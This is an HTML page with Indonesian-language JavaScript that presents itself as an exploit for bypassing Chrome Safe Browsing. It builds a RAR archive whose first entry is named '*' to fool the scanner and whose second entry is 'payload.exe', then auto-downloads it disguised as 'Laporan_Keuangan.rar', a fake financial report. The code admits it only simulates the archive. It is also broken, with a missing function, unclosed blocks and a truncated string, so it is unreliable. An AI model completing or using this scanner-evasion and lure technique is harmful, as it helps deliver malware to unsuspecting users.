<body>
<div class="panel" id="main-panel">

<p>Membuat file RAR dinamis dengan entri pertama bernama <code>*</code> untuk melewati pemindaian Safe Browsing, lalu menyelipkan file .exe di entri kedua.</p>

<script>
const startBtn = document.getElementById("start-btn");
const statusDiv = document.getElementById("status");

    // 1. Entri Pertama: Nama file "*" (Memicu bug ExactMatch di Chrome)

    const namaFile2 = encoder.encode("payload.exe");
    const isiFile2 = new Uint8Array([0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00]); 
    
    // --- Perakitan Header RAR5 (Sederhana) ---
    // CATATAN: Ini adalah struktur RAR minimalis untuk tujuan demonstrasi logika.
    // RAR asli memiliki kompleksitas CRC dan header tambahan.
    
    function buatHeaderRar(namaBytes, ukuranFile) {
        // Header block dasar (CRC32, Header Size, Header Type, Header Flags)
        // Flag 0x0002 = File Header
        const headerSize = 32 + namaBytes.length; 
        const header = new Uint8Array(headerSize);
        const view = new DataView(header.buffer);
        
        // Magic Signature RAR5 (8 bytes)
        const signature = new Uint8Array([0x52, 0x61, 0x72, 0x21, 0x1A, 0x07, 0x01, 0x00]); // Rar!\x1a\x07\x01\x00
        
        // (Implementasi byte-level RAR sangat kompleks, 
        // jadi kita akan mensimulasikan struktur pemanggil filenya)
        
        return { header, signature };
    }

    // Karena membuat RAR yang valid 100% dari nol di JS sangat panjang (ratusan baris),
    // Kita akan mensimulasikan logika exploit-nya dengan membuat file yang memiliki signature RAR
    // dan struktur nama file yang sesuai dengan eksploitasi.
    
    // Sebagai gantinya, kita buat file teks yang meniru logika exploit untuk diuji coba:
    const rarSimulasi = encoder.encode(
        "Rar!\x1a\x07\x01\x00" + // Signature RAR5
        "[FILE HEADER: Nama = '*']" + // Entri pertama (Bintang)
        "Ini file penipu scanner..." +
        "[FILE HEADER: Nama = 'payload.exe']" + // Entri kedua (Payload)

    return new Blob([rarSimulasi], { type: 'application/vnd.rar' });
}

startBtn.addEventListener("click", () => {
    startBtn.disabled = true;
    statusDiv.textContent = "Membangun file RAR...";

    setTimeout(() => {
        try {
            const rarBlob = buatRarBypass();
            const url = URL.createObjectURL(rarBlob);
            
            const a = document.createElement("a");
            a.href = url;
            a.download = "Laporan_Keuangan.rar"; // Nama file yang diunduh
            document.body.appendChild(a);
            a.click();
            
            setTimeout(() => {
                document.body.removeChild(a);
                URL.revokeObjectURL(url);
            }, 3000);
            
            statusDiv.textContent = "File RAR berhasil diunduh. Cek folder Download.";

});
